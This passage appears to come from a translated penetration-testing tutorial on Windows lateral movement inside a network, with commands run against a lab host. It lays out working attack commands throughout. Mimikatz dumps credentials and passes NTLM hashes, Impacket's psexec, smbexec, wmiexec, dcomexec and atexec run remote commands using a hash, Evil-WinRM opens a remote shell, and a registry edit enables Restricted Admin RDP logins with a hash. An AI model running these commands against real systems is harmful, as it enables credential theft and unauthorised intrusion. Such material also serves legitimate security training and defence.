The remote transmission protocol of PowerShell is based on the WinRM specification and provides powerful remote management functions. The PowerShell Cmdlet of `Enter-PSSession` can initiate a session with a remote host.

```powershell
# Specify the remote system username
$User = "win-98f4vaj03t5\administrator"
# Specify the user's password
$Password = ConvertTo-SecureString -String "H3rmesk1t@2023" -AsPlainText -Force
# Integrate username and password to import Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
# Create a session based on the provided credentials
New-PSSession -Name WinRM1 -ComputerName 10.10.10.137 -Credential $Cred -Port 5985

# View the currently created PSSession session
Get-PSSession

# Select a session to enter session interaction mode
Enter-PSSession -Name WinRM1
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%206.png)

```powershell
# Specify the remote system username
$User = "win-98f4vaj03t5\administrator"
# Specify the user's password
$Password = ConvertTo-SecureString -String "H3rmesk1t@2023" -AsPlainText -Force
# Integrate username and password to import Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
# Create a session based on the provided credentials
$Sess = New-PSSession -Name WinRM2 -ComputerName 10.10.10.137 -Credential $Cred -Port 5985
# Execute commands in the created session
Invoke-Command -Session $Sess -ScriptBlock {dir C:\}
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5
%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%207.png)

### Evil-Winrm

`Evil-Winrm` is a penetration framework based on the `WinRM Shell` that can complete simple attack tasks on the target host that has started the `WinRm` service through the provided username password or user hash value. For specific use, please refer to the reference project [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).

```powershell
evil-winrm -i 10.10.10.137 -u Administrator -p H3rmesk1t@2023
```

# Hash delivery attack

Hash pass (`Pass The Hash`, `PTH`) is an attack technology against the NTLM protocol. When generating Response in the third step of NTLM identity authentication, the client directly uses the user's NTLM` hash value to calculate, and the user's plaintext password does not participate in the entire authentication process, that is, in the `Windows` system, only the user hash value is used to authenticate the user accessing the resource.

In a domain environment, users generally use a domain account when logging into the computer, and most computers may use the same local administrator account and password when installed. Therefore, hashing pass in the domain environment can often obtain intranet host permissions in batches.

## Utilization of hash delivery attacks

### Mimikatz

Mimikatz hash delivery function built-in, requiring local administrator permissions.

```powershell
# Crawl user hash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%208.png)

```powershell
# Use the crawled domain administrator's NTLM HASH for hashing
# A new command line window will pop up when the successful execution is performed. The domain administrator privileges can be accessed in the new command line.
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:hack.local /ntlm:96b26b0744352a9d91516132c3fe485d" exit
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%209.png)

###Impacket

Several scripts in the Impacket project that have remote command execution function can basically perform `PTH` attacks, the common ones include `psexec.py`, `smbexec.py` and `wmiexec.py`.

```bash
# psexec.py
python3 psexec.py -hashes :96b26b0744352a9d91516132c3fe485d hack/administrator@10.10.10.137
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2010.png)

```bash
# smbexec.py
python3 smbexec.py -hashes:96b26b0744352a9d91516132c3fe485d hack/administrator@10.10.10.137
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2011.png)

```bash
# wmiexec.py
python3 wmiexec.py -hashes:96b26b0744352a9d91516132c3fe485d hack/administrator@10.10.10.137
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2012.png)

```bash
# dcomexec.py, usually uses MMC20, and DCOM sometimes encounters errors of 0x800706ba, which are usually intercepted by the firewall.
python3 dcomexec.py -object MMC20 -hashes :96b26b0744352a9d91516132c3fe485d hac k/administrator@10.10.10.137
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2013.png)

```bash
# atexec.py, execute commands on the target machine through the MS-TSCH protocol control plan task and obtain echo
python3 atexec.py -hashes :96b26b0744352a9d91516132c3fe485d hack/administrator@10.10.10.137 whoami
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2014.png)

## Log in to the remote desktop using hash delivery

Hash delivery can also establish a remote desktop connection under specific conditions. The conditions required are as follows:

1. The remote host has enabled the "restricted administrator" mode;
2. The user used to log in to the remote desktop is located in the administrator group of the remote host;
3. Need to obtain the hash of the target user

`Windows Server 2012 R2` and above versions of `Windows` systems adopt a new version of `RDP`, which supports `Restricted Admin Mode`. After turning on this mode, the attacker can directly `RDP` to the target host through `PTH`. Restricted Administrator mode is enabled by default on `Windows 8.1` and `Windows Server 2012 R2`.

```bash
# Manually enable Restricted Admin Mode
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
# Check whether Restricted Admin Mode is enabled. If the value is 0, it means it is started; if it is 2, it is not enabled
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

When the target host is enabled `Restricted Admin Mode`, it can be used through `Mimikatz`.

Principle: After the hash is successfully passed, execute the `mstsc.exe /restrictedadmin` command to run the remote desktop client in restricted administrator mode, achieving the effect of logging into the remote desktop without entering the username and password.

```bash
mimikatz.exe
privilege::debug
sekurlsa::pth /user:Administrator /domain:hack.local /ntlm:96b26b0744352a9d91516132c3fe485d "/run:mstsc.exe /restrictedadmin"
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2015.png)

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%2016.png)